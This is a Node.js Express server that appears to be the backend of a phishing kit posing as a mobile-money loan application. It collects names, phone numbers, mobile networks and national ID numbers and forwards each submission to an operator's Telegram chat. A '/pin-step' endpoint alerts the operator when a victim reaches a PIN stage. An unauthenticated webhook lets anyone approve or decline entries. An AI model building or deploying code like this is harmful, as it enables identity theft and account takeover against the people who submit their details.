const express = require("express");
const axios = require("axios");
const path = require("path");
const mongoose = require("mongoose");

const app = express();

app.use(express.json());
app.use(express.urlencoded({ extended: true }));
app.use(express.static(__dirname));

// ENV
const BOT_TOKEN = process.env.BOT_TOKEN;
const CHAT_ID = process.env.CHAT_ID;
const MONGO_URI = process.env.MONGO_URI;

// ================= DB CONNECT (SAFE) =================
let dbConnected = false;

if (MONGO_URI) {
  mongoose.connect(MONGO_URI)
    .then(() => {
      dbConnected = true;
      console.log("MongoDB connected");
    })
    .catch(err => {
      console.log("MongoDB error:", err.message);
    });
} else {
  console.log("⚠️ MONGO_URI not set");
}

// ================= MODEL =================
const userSchema = new mongoose.Schema({
  name: String,
  phone: { type: String, unique: true },
  network: String,
  amount: String,
  nationalId: String,
  status: { type: String, default: "pending" }
});

const User = mongoose.model("User", userSchema);

// ================= HOME =================
app.get("/", (req, res) => {
  res.sendFile(path.join(__dirname, "index.html"));
});

// ================= TEST =================
app.get("/test", (req, res) => {
  res.json({ ok: true });
});

// ================= APPLY (FIXED MAIN ISSUE) =================
app.post("/apply", async (req, res) => {
  try {
    const { name, phone, network, amount, nationalId } = req.body;

    if (!name || !phone || !network || !amount || !nationalId) {
      return res.status(400).json({ success: false });
    }

    console.log("Apply received:", phone);

    // Save to DB ONLY if connected (prevents crash)
    if (dbConnected) {
      try {
        await User.findOneAndUpdate(
          { phone },
          { name, phone, network, amount, nationalId, status: "pending" },
          { upsert: true, new: true }
        );
      } catch (dbErr) {
        console.log("DB save error (ignored):", dbErr.message);
      }
    }

    // Telegram (ONLY if config exists)
    if (BOT_TOKEN && CHAT_ID) {
      try {
        const message = `
📥 NEW APPLICATION

👤 ${name}
📱 ${phone}
📡 ${network}
💰 ${amount}
🆔 ${nationalId}
`;

        await axios.post(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
          chat_id: CHAT_ID,
          text: message
        });

      } catch (tgErr) {
        console.log("Telegram error:", tgErr.message);
      }
    }

    return res.json({ success: true, phone });

  } catch (err) {
    console.log("APPLY CRASH:", err.message);
    return res.status(500).json({ success: false });
  }
});

// ================= STATUS =================
app.get("/status/:phone", async (req, res) => {
  try {
    if (!dbConnected) {
      return res.json({ status: "pending" });
    }

    const user = await User.findOne({ phone: req.params.phone });

    return res.json({ status: user ? user.status : "pending" });

  } catch (err) {
    return res.status(500).json({ status: "error" });
  }
});

// ================= WEBHOOK =================
app.post("/webhook", async (req, res) => {
  try {
    if (!req.body.callback_query) return res.sendStatus(200);

    const action = req.body.callback_query.data;
    const phone = action.split("_")[1];

    const status = action.startsWith("approve") ? "approved" : "declined";

    if (dbConnected) {
      await User.findOneAndUpdate({ phone }, { status });
    }

    if (BOT_TOKEN && CHAT_ID) {
      await axios.post(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
        chat_id: CHAT_ID,
        text: `Status: ${phone} → ${status}`
      });
    }

    res.sendStatus(200);

  } catch (err) {
    console.log("WEBHOOK ERROR:", err.message);
    res.sendStatus(200);
  }
});

// ================= PIN STEP =================
app.post("/pin-step", async (req, res) => {
  try {
    const { phone } = req.body;

    if (BOT_TOKEN && CHAT_ID) {
      await axios.post(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
        chat_id: CHAT_ID,
        text: `PIN STEP: ${phone}`
      });
    }

    res.sendStatus(200);

  } catch (err) {
    res.sendStatus(200);
  }
});

// ================= START =================
const PORT = process.env.PORT || 8080;
app.listen(PORT, () => {
  console.log("Server running on port " + PORT);
});
